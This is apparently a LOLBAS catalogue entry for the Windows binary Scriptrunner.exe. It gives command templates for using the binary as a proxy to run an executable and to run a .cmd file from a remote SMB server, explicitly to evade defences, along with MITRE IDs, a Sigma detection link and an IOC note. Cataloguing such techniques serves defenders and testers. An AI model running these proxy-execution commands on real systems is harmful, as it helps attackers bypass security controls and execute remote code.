---
Acknowledgement:
- Person: Nick Ty
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: Scriptrunner.exe -appvscript {PATH:.exe}
  Description: Executes executable
  MitreID: T1202
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Execute: EXE
  Usecase: Execute binary through proxy binary to evade defensive counter measures
- Category: Execute
  Command: ScriptRunner.exe -appvscript {PATH_SMB:.cmd}
  Description: Executes cmd file from remote server
  MitreID: T1218
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Execute: Remote
  - Execute: CMD
  Usecase: Execute binary through proxy binary from external server to evade defensive
    counter measures
Created: 2018-05-25
Description: Execute binary through proxy binary to evade defensive counter measures
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_servu_susp_child_process.yml
- IOC: Scriptrunner.exe should not be in use unless App-v is deployed
Full_Path:
- Path: C:\Windows\System32\scriptrunner.exe
- Path: C:\Windows\SysWOW64\scriptrunner.exe
Name: Scriptrunner.exe
Resources:
- Link: https://twitter.com/KyleHanslovan/status/914800377580503040
- Link: https://twitter.com/NickTyrer/status/914234924655312896
- Link: https://github.com/MoooKitty/Code-Execution
mitre_data:
  technique_ids:
  - T1202
  - T1218
tags:
- lolbas/osbinaries
---

# Scriptrunner.exe

Execute binary through proxy binary to evade defensive counter measures

# Path(s)

- `C:\Windows\System32\scriptrunner.exe`
- `C:\Windows\SysWOW64\scriptrunner.exe`

# Execute Commands

Executes executable

```batch
Scriptrunner.exe -appvscript {PATH:.exe}
```

- **Usecase:** Execute binary through proxy binary to evade defensive counter measures
- **Privileges Required:** User
- **MitreID:** `T1202`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



Executes cmd file from remote server

```batch
ScriptRunner.exe -appvscript {PATH_SMB:.cmd}
```

- **Usecase:** Execute binary through proxy binary from external server to evade defensive counter measures
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Resource(s)

- https://twitter.com/KyleHanslovan/status/914800377580503040
- https://twitter.com/NickTyrer/status/914234924655312896
- https://github.com/MoooKitty/Code-Execution
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Nick Ty